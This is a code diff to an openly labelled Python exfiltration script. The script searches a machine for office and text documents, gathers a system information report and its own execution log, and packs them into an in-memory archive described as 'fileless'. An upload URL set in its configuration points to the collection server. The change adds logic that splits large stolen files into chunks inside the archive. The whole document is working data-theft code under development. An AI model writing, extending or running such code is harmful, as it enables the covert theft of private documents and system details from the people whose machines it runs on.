@@ -14,6 +14,7 @@ EXFIL_URL = "http://localhost:5000/upload"      # server url where .zip will be 
 DOCUMENT_EXTENSIONS = ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.txt', '.rtf', '.odt', '.ods', 'odp']
 MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB per file
 MAX_FILES = 100  # max files to exfil
+CHUNK_SIZE = 50 * 1024 * 1024
 
 _log_buffer = io.StringIO()
 _original_stdout = sys.stdout
@@ -86,11 +87,13 @@ def find_documents():
     print(f"[+] Document search complete. Found {len(documents)} files.")
     return documents
 
+
 def create_in_memory_archive(files, system_info, log_content):
     print("[*] Creating in-memory archive...")
     zip_buffer = io.BytesIO()
     
     with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED, compresslevel=6) as zipf:
+        # Add comprehensive system info (this part is unchanged)
         info_content = f"""========================================
 SYSTEM INFORMATION REPORT
 ========================================
@@ -109,6 +112,7 @@ COLLECTION SUMMARY
 ==================
 Total Files Found: {len(files)}
 Max File Size Limit: {MAX_FILE_SIZE / (1024*1024):.1f} MB
+Chunk Size: {CHUNK_SIZE / (1024*1024):.1f} MB
 Collection Method: Fileless (In-Memory)
 
 
@@ -126,16 +130,33 @@ FILE LIST
         info_content += f"\n========================================\nGenerated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n========================================\n"
         
         zipf.writestr("SYSTEM_INFO.txt", info_content)
-        
         zipf.writestr("execution_log.txt", log_content)
         
+        # --- INTEGRATED FILE SPLITTING AND ADDING ---
         for file_path in files:
             try:
                 with open(file_path, 'rb') as f:
                     file_data = f.read()
                     filename = os.path.basename(file_path)
-                    zipf.writestr(f"documents/{filename}", file_data)
-            except (OSError, PermissionError):
+                    
+                    # Check if file needs to be split
+                    if len(file_data) > CHUNK_SIZE:
+                        print(f"[*] Splitting large file: {filename}")
+                        part_num = 0
+                        offset = 0
+                        while offset < len(file_data):
+                            chunk = file_data[offset : offset + CHUNK_SIZE]
+                            chunk_filename = f"documents/chunks/{filename}.part{part_num}"
+                            zipf.writestr(chunk_filename, chunk)
+                            offset += CHUNK_SIZE
+                            part_num += 1
+                        print(f"[+] Split {filename} into {part_num} chunks.")
+                    else:
+                        # File is small enough, add it directly
+                        zipf.writestr(f"documents/{filename}", file_data)
+
+            except (OSError, PermissionError) as e:
+                print(f"[!] Could not read {file_path}: {e}")
                 continue
     
     zip_buffer.seek(0)
